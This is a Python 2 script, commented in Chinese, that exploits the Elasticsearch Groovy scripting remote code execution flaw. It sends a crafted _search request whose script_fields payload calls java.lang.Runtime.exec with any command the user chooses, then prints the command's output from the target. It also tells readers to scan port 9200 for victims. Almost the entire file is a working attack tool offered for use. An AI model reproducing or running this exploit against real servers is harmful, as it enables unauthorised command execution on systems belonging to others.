#!/usr/bin/env python
# -*- coding: gbk -*-
# -*- coding: utf_8 -*-

import os, sys, re

try:
    import requests
except ImportError:
    raise SystemExit('\n[!] requests模块导入错误,请执行pip install requests安装!')


def usage():
    print '+' + '-' * 60 + '+'
    print '\t Elastic search Groovy远程代码执行漏洞EXP'
    print '+' + '-' * 60 + '+'
    if len(sys.argv) != 3:
        print '用法: ' + os.path.basename(sys.argv[0]) + ' 待测Elastic search网站URL 待执行的命令'
        print '实例: ' + os.path.basename(sys.argv[0]) + ' https://www.waitalone.cn:9200/ "ifconfig"'
        sys.exit()


def elastic(cmd):
    """
    Elastic search 命令执行函数
    漏洞详情:http://zone.wooyun.org/content/18915
    测试案例:请自行扫描9200端口的网站吧。
    """
    results = []
    elastic_url = url + '_search?pretty'
    exp = '{"size":1,"script_fields": ' \
          '{"iswin": {"script":"java.lang.Math.class.forName(\\"java.lang.Runtime\\")' \
          '.getRuntime().exec(\\"' + cmd + '\\").getText()","lang": "groovy"}}}'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    # print exp
    try:
        content = requests.post(elastic_url, data=exp, headers=headers, timeout=10).content
    except Exception:
        print '[!] 报告爷,有错误发生,请检查是否连接超时!'
        raise SystemExit
    else:
        result = re.findall(re.compile('\"iswin\" : \[ "(.*?)" \]'), content)
        if result:
            results.append(result[0])
    return results


if __name__ == '__main__':
    usage()
    url = sys.argv[1]
    if url[-1] != '/': url += '/'
    cmd = sys.argv[2]
    command = elastic(cmd)
    if command:
        print command[0].replace('\\n', '\n').replace('\\r','').replace('\\\\','\\')
    else:
        print '[!] 报告爷,漏洞不存在或者输入命令错误!'

